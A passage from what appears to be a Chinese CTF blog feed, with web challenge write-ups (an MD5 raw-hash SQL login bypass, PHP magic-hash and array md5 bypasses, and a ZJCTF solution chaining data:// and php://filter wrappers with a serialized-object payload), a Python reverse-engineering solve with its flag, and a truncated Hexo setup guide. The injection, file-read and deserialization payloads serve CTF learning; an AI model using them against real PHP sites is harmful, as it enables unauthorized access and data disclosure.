class="line"><span class="comment">_M;Ze&#x27;޸ϙ</span></span><br><span class="line"><span class="comment">5f4dcc3b5aa765d61d8327deb882cf99</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">第一个输出结果的是16位md5值转化为字符串输出</span></span><br><span class="line"><span class="comment">第二个输出是正常的32位md5值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这里存在一个特殊的字符串 ffifdyop 经过第一种加密后输出 &#x27;or&#x27;6]!r,b</span></span><br><span class="line">所以原语句就变成了select * <span class="keyword">from</span> <span class="string">&#x27;admin&#x27;</span> where password=<span class="string">&#x27;or&#x27;</span><span class="number">6</span>完成完成密码登陆</span><br></pre></td></tr></table></figure><p>payload：url?password=ffifdyop</p><p><strong>第二关</strong></p><p>查看源代码注释</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">$a = $GET[&#x27;a&#x27;];</span></span><br><span class="line"><span class="comment">$b = $_GET[&#x27;b&#x27;];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span></span><br><span class="line"><span class="comment">    // wow, glzjin wants a girl friend.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><p>弱类型比较   payload：url?a=QNKCDZO&amp;b=240610708</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">记录几个常见的弱类型比较值</span><br><span class="line">md5加密后以0E开头：</span><br><span class="line"></span><br><span class="line">    QNKCDZO</span><br><span class="line">    240610708</span><br><span class="line">    s878926199a</span><br><span class="line">    s155964671a</span><br><span class="line">    s214587387a</span><br><span class="line">    s214587387a</span><br><span class="line">sha1加密后以0E开头：</span><br><span class="line"></span><br><span class="line">    aaroZmOk</span><br><span class="line">    aaK1STfY</span><br><span class="line">    aaO8zKZF</span><br><span class="line">    aa3OFF9m</span><br></pre></td></tr></table></figure><p><strong>第三关</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>强类型比较，使用数组绕过</p><p>原理：md5在处理数组类型时无法读取其值，但是不报错，所以就完成了绕过</p><p>payload：url?param1[]=11&amp;param2[]=22</p><h4 id="BUU复现-ZJCTF-2019-NiZhuanSiWei"><a href="#BUU复现-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="BUU复现-[ZJCTF 2019]NiZhuanSiWei"></a>BUU复现-[ZJCTF 2019]NiZhuanSiWei</h4><p><strong>考点：php伪协议、反序列化</strong></p><p>主页源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>分析：</p><p>1.一共有三个参数可控</p><p>2.text参数对应file_get_contents()函数，——&gt;想到伪协议漏洞</p><p>3.file参数对应include()函数，——&gt;想到任意文件读取</p><p>4.password参数对应 unserialize()函数，——想到反序列化漏洞</p><p>5.首先让text读取内容等于”welcome to the zjctf”，然后读取useless.php源码，最后进行反序列化</p><p><strong>第一步：</strong></p><p>利用data伪协议，直接让text等于指定字符串    ?text=data://text/plain,welcome to the zjctf</p><p><strong>第二步：</strong></p><p>利用php://filter任意读，?file=php://filter/read=convert.base64-encode/resource=useless.php</p><p>base64解密后获得useless.php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>第三步：</strong></p><p>利用password参数对useless.php反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&#x27;flag.php&#x27;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Flag();</span><br><span class="line">print_r(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment">#输出 O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; </span></span><br></pre></td></tr></table></figure><p>完整payload如下</p><p>1.其中data协议是否采用base64加密都可以</p><p>2.file参数要包含一个存在的文件（尝试了/etc/passwd  没出flag没太懂）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://61db48e7-8040-4ad7-b23d-908c941c0067.node3.buuoj.cn/</span><br><span class="line">?text=data://text/plain,welcome to the zjctf</span><br><span class="line">&amp;file=useless.php</span><br><span class="line">&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><h4 id="preg-replace-e模式造成代码执行"><a href="#preg-replace-e模式造成代码执行" class="headerlink" title="preg_replace /e模式造成代码执行"></a>preg_replace /e模式造成代码执行</h4><p><a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;WEB1-HCTF2018-WEB&quot;&gt;&lt;a href=&quot;#WEB1-HCTF2018-WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB1-HCTF2018-WEB&quot;&gt;&lt;/a&gt;WEB1-HCTF2018-WEB&lt;/h4&gt;&lt;p&gt;version：4.</summary>
      
    
    
    
    <category term="WEB" scheme="http://blog.falsectf.top/categories/WEB/"/>
    
    
    <category term="CTF" scheme="http://blog.falsectf.top/tags/CTF/"/>
    
    <category term="WEB" scheme="http://blog.falsectf.top/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>安恒杯2020-02月赛</title>
    <link href="http://blog.falsectf.top/2020/02/28/d624.html"/>
    <id>http://blog.falsectf.top/2020/02/28/d624.html</id>
    <published>2020-02-28T06:19:04.000Z</published>
    <updated>2020-12-31T11:50:13.014Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h4><h4 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h4><p>第一次做逆序题，这次是一道简单的py逆向题用来练习练习<br>题目附件是一个pyc文件，可以使用uncompyle6反编译为py文件<br>uncompyle6链接：<a href="https://github.com/rocky/python-uncompyle6">https://github.com/rocky/python-uncompyle6</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">caser</span>(<span class="params">flag</span>):</span></span><br><span class="line">    enc1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        enc1 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) - <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> enc1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rail</span>(<span class="params">flag</span>):</span></span><br><span class="line">    p1 = p2 = p3 = enc2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        j = i % <span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">0</span>:</span><br><span class="line">            p1 += flag[i]</span><br><span class="line">        <span class="keyword">elif</span> j == <span class="number">1</span>:</span><br><span class="line">            p2 += flag[i]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p3 += flag[i]</span><br><span class="line"></span><br><span class="line">    enc2 = p1 + p2 + p3</span><br><span class="line">    <span class="keyword">return</span> enc2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rep</span>(<span class="params">flag</span>):</span></span><br><span class="line">    table1 = <span class="string">&#x27;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#x27;</span></span><br><span class="line">    table2 = <span class="string">&#x27;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#x27;</span></span><br><span class="line">    table = string.maketrans(table1, table2)</span><br><span class="line">    <span class="keyword">return</span> flag.translate(table, <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    flag = raw_input(<span class="string">&#x27;please input flag to check:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> rep(base64.b64encode(rail(caser(flag)))) == <span class="string">&#x27;ywjCytmRxI9CycWZngD2ncTDkZqYlJrGmhHCxISUnfWSlgfDlJi&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Success!you got it!&#x27;</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;try a gain&#x27;</span></span><br></pre></td></tr></table></figure><p>如果是汇编的逆向我就不会了 但是py的还是可以搞一搞的</p><p>这是一个比较简单的算法，如果不会写脚本用手也可以算出来<br>加密<br>1、flag先逐位进行ascii值-5再转化为ascii码的操作 caser()函数<br>2、对flag每三位一循环的依次截取<br>3、对上述结果进行了base64加密<br>4、对base64加密结果大小写进行转换，并且删除了=</p><p>这个算法，只要我们输入的数==’ywjCytmRxI9CycWZngD2ncTDkZqYlJrGmhHCxISUnfWSlgfDlJi’就可以拿到flag</p><p>解密<br>1、原函数照抄，rep()函数进行大小写转换<br>2、进行base64解密，注意要加上’=’ 否则可能会报错  在线解密应该可以解出来<br>3、rail()函数是最麻烦的一个    分析后发现p1、p2、p3分别截取<br>了13、13、12位字符串，将其取出来并逐个进行拼接<br>4、将拼接结果逐位进行ascii值+5并转换位ascii码-得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64,string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rep</span>(<span class="params">flag</span>):</span> <span class="comment">#替换大小写</span></span><br><span class="line">    table1 = <span class="string">&#x27;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#x27;</span></span><br><span class="line">    table2 = <span class="string">&#x27;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#x27;</span></span><br><span class="line">    table = <span class="built_in">str</span>.maketrans(table1, table2)</span><br><span class="line">    <span class="keyword">return</span> flag.translate(table)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deflag</span>(<span class="params">flag</span>):</span>  <span class="comment">#解密flag</span></span><br><span class="line">    flag_str=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        flag_str += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)+<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">return</span> flag_str</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p1_p2_p3</span>(<span class="params">enc</span>):</span>  <span class="comment">#解密p1,p2,p3</span></span><br><span class="line">    p1 = <span class="built_in">str</span>(enc[<span class="number">0</span>:<span class="number">13</span>]).replace(<span class="string">&quot;b&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\\\\&quot;</span>,<span class="string">&quot;\\&quot;</span>)  <span class="comment">#切片后会输入 b&#x27;xxxx&#x27;   所以删掉了b&#x27;&#x27;   其中会有\\的转义字符，只需要一个即可</span></span><br><span class="line">    p2 = <span class="built_in">str</span>(enc[<span class="number">13</span>:<span class="number">26</span>]).replace(<span class="string">&quot;b&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\\\\&quot;</span>,<span class="string">&quot;\\&quot;</span>)</span><br><span class="line">    p3 = <span class="built_in">str</span>(enc[<span class="number">26</span>:]).replace(<span class="string">&quot;b&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\\\\&quot;</span>,<span class="string">&quot;\\&quot;</span>)+<span class="string">&quot; &quot;</span></span><br><span class="line">    de_str=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">13</span>):</span><br><span class="line">        de_str +=p1[i]+p2[i]+p3[i]  <span class="comment">#将每一段的第一个字符依次拼接   即i%3==0   ==1  ==2,3  ...</span></span><br><span class="line">    <span class="keyword">return</span> de_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base_str=rep(<span class="string">&#x27;ywjCytmRxI9CycWZngD2ncTDkZqYlJrGmhHCxISUnfWSlgfDlJi&#x27;</span>)+<span class="string">&quot;=&quot;</span>  <span class="comment">#大小写替换</span></span><br><span class="line">debase_str = base64.b64decode(base_str)  <span class="comment">#base64解密</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(deflag(p1_p2_p3(debase_str)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;ca90f038b900ac91471a3fe9b1e38579&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h4&gt;&lt;h4 id=&quot;Reverse&quot;&gt;&lt;a href=&quot;#Reverse&quot; class=&quot;headerlink&quot; title=&quot;Reverse</summary>
      
    
    
    
    <category term="CTF" scheme="http://blog.falsectf.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://blog.falsectf.top/tags/CTF/"/>
    
    <category term="安恒杯" scheme="http://blog.falsectf.top/tags/%E5%AE%89%E6%81%92%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>Hexo搭建-matery主题</title>
    <link href="http://blog.falsectf.top/2020/02/28/8dc0.html"/>
    <id>http://blog.falsectf.top/2020/02/28/8dc0.html</id>
    <published>2020-02-28T04:33:59.000Z</published>
    <updated>2020-12-31T11:50:19.455Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1、前期准备"><a href="#1、前期准备" class="headerlink" title="1、前期准备"></a>1、前期准备</h4><p>1.安装Git<br>windwows：<a href="https://gitforwindows.org/">https://gitforwindows.org/</a><br>linux   ：<code>sudo apt-get install git</code></p><p>2.安装nodejs<br>windwos：<a href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a><br>linux：如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nodejs</span><br><span class="line">sudo apt-get install npm</span><br><span class="line">安装完成后，打开命令行检查，windwos也相同</span><br><span class="line">node -v</span><br><span class="line">npm -v</span><br></pre></td></tr></table></figure><p>3.安装Hexo</p><p>在安装之前先安装一下淘宝镜像源，不然可能会后续出现因为网络问题报错<br>命令：<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code><br>然后在任意位置创建例如：Blog文件夹，然后右键打开安装好的Git Bash Here<br>安装Hexo命令：<code>cnpm install -g hexo-cli </code><br>检测是否安装 ：<code>hexo -v</code><br>初始化博客   ：<code>hexo init </code><br>启动博客   ：<code>hexo s</code><br>此时，打开<a href="http://localhost:4000/">http://localhost:4000</a> 即可访问到hexo</p><h4 id="2、连接Github"><a href="#2、连接Github" class="headerlink" title="2、连接Github"></a>2、连接Github</h4><p>1.打开<a href="https://github.com/">https://github.com/</a> 注册一个账户<br>2.创建一个与你用户名相同的仓库，整体为：用户名.github.io ，只有这样才会被Github page识别<br>3.生成SSH添加到Github</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">本地Git Bash Here中执行</span><br><span class="line">git config --global user.name &quot;yourname&quot;</span><br><span class="line">git config --global user.email &quot;youremail&quot;</span><br><span class="line">检查输入的用户名和邮箱是否有错误</span><br><span class="line">git config user.name</span><br><span class="line">git config user.email</span><br><span class="line">创建SSH密钥</span><br><span class="line">ssh-keygen -t rsa -C &quot;youremail&quot;</span><br></pre></td></tr></table></figure><p>此时会生成id_rsa.pub文件，将内容复制到github中，添加ssh密钥 <a href="https://github.com/settings/keys">https://github.com/settings/keys</a><br>4.测试是否连接github成功：<code>ssh -T git@github.com</code><br>打开博客根目录的_config.yml文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:仓库名.github.io.git  推荐直接复制自己的仓库名</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><h4 id="3、部署hexo到Github"><a href="#3、部署hexo到Github" class="headerlink" title="3、部署hexo到Github"></a>3、部署hexo到Github</h4><p>进到之前创建好的Blog目录下，打开git bash here 执行<code>cnpm install --save hexo-deployer-git</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">清除缓存 hexo clean</span><br><span class="line">生成静态文章 hexo generate 缩写 hexo g</span><br><span class="line">部署文章到Github hexo deploy 缩写：hexo d</span><br></pre></td></tr></table></figure><p>此时，访问仓库名.github.io应该就可以访问到博客啦</p><h4 id="4、更换主题"><a href="#4、更换主题" class="headerlink" title="4、更换主题"></a>4、更换主题</h4><p>下载hexo-theme-matery主题<code>git clone https://github.com/blinkfox/hexo-theme-matery.git</code><br>修改根目录下的_config.yml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Extensions</span><br><span class="line">## Plugins: https://hexo.io/plugins/</span><br><span class="line">## Themes: https://hexo.io/themes/</span><br><span class="line">theme: hexo-theme-matery #根据下载后的主题名来写</span><br></pre></td></tr></table></figure><p>1.新建分类categories页：<code>hexo new page &quot;categories&quot;</code><br>编辑你刚刚新建的页面文件 /source/categories/index.md</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: categories</span><br><span class="line">date: 2018-09-30 17:25:30</span><br><span class="line">type: &quot;categories&quot;</span><br><span class="line">layout: &quot;categories&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>2.新建标签 tags 页：<code>hexo new page &quot;tags&quot;</code><br>编辑你刚刚新建的页面文件 /source/tags/index.md</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: tags</span><br><span class="line">date: 2018-09-30 18:23:38</span><br><span class="line">type: &quot;tags&quot;</span><br><span class="line">layout: &quot;tags&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>3.新建关于我 about 页：<code>hexo new page &quot;about&quot;</code><br>编辑你刚刚新建的页面文件 /source/about/index.md</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: about</span><br><span class="line">date: 2018-09-30 17:25:30</span><br><span class="line">type: &quot;about&quot;</span><br><span class="line">layout: &quot;about&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>4.新建友情连接 friends 页（可选的）<code>hexo new page &quot;friends&quot;</code><br>编辑你刚刚新建的页面文件 /source/friends/index.md</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: friends</span><br><span class="line">date: 2018-12-12 21:25:30</span><br><span class="line">type: &quot;friends&quot;</span><br><span class="line">layout: &quot;friends&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>同时，在source目录下创建_data目录，在_data目录下新建friends.json文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 